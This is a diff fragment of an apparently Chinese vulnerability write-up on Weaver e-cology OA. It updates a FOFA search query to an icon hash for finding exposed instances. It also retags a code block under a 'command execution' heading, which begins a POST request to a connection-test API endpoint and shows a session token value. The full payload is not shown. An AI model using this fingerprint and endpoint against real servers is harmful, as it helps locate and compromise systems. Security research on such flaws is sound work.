@@ -5,7 +5,7 @@
 ## fofa
 
 ```yaml
-app="泛微-OA（e-cology）"
+icon_hash="-1619753057"
 ```
 
 ## poc
@@ -88,7 +88,7 @@ ETEAMSID: THIRD_def423a1574e66bbdb29bc647cd8ccf6
 
 ### 执行命令
 
-```
+```javascript
 POST /api/dw/connSetting/testConnByBasePassword HTTP/1.1
 Host: 
 Content-Length: 199
